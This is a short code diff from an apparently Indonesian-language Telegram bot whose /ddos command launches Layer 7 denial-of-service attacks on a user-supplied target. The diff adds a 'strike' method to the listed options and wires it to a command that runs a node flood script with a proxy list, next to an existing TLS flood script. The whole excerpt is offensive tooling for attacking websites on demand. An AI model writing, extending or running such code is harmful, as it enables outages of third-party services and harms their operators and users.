@@ -101,6 +101,7 @@ bot.command('methods', (ctx) => {
   const methodsList = `
 Berikut adalah metode Layer 7 yang tersedia:
 - tls
+- strike
   `;
   ctx.reply(methodsList);
 });
@@ -132,7 +133,8 @@ bot.command('ddos', async (ctx) => {
     const initialMessage = await ctx.reply(`Memulai serangan ke ${target} dengan metode ${methods} selama ${duration} detik.`);
 
     const attackMethods = {
-      tls: `node ./lib/mt/Tls.js ${target} ${duration} 100 10`,    
+      tls: `node ./lib/mt/Tls.js ${target} ${duration} 100 10`,
+      strike: `node ./lib/mt/strike.js GET ${target} ${duration} 10 100 proxy.txt`,
     };
 
     if (attackMethods[methods]) {
